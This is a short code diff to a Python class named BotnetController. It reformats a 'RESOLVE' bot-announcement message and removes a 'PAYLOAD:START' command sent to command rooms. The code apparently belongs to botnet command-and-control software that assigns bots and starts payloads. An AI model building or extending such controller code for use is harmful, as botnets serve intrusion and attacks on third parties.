@@ -182,7 +182,7 @@ class BotnetController:
             if not self.command_room_lock.acquire(False):
                 return
             self.announce_room.send_text(
-                f"RESOLVE {botid}:{"E" if self.command_rooms[room_id].payload_status else "D"}:{room_id}"
+                "RESOLVE {}:{}:{}".format(botid, "E" if self.command_rooms[room_id].payload_status else "D", room_id)
             )
             self.assign_bot(msgbody, room_id)
             self.command_room_lock.release()
@@ -218,7 +218,6 @@ class BotnetController:
 
     def start_payload_on_room(self, room: CommandRoom):
         room.start_payload()
-        room.send_cmd("PAYLOAD:START")
     
     def start_payload_all_rooms(self):
         with self.command_room_lock:
